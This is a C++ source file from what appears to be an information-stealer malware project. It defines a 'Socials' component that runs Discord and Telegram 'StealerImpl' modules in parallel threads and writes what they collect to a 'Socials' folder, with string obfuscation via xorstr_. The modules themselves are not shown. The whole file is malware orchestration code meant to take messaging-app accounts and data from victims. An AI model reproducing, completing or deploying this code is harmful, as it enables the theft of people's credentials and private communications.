//
// Created by .1qxz on 07.06.2024.
//

#include <thread>
#include "Socials.h"
#include "impl/Discord.h"
#include "impl/Telegram.h"

Socials::Socials()
{
    this->modules.push_back(new Discord());
    this->modules.push_back(new Telegram());
}

void Socials::execute(fs::path &root) {
    fs::path socials_path = root / xorstr_("Socials");
    std::vector<std::thread> threads;

    for(StealerImpl* module : this->modules) {
        threads.emplace_back([module, &socials_path]() {
            module->execute(socials_path);
        });
    }

    for(auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}
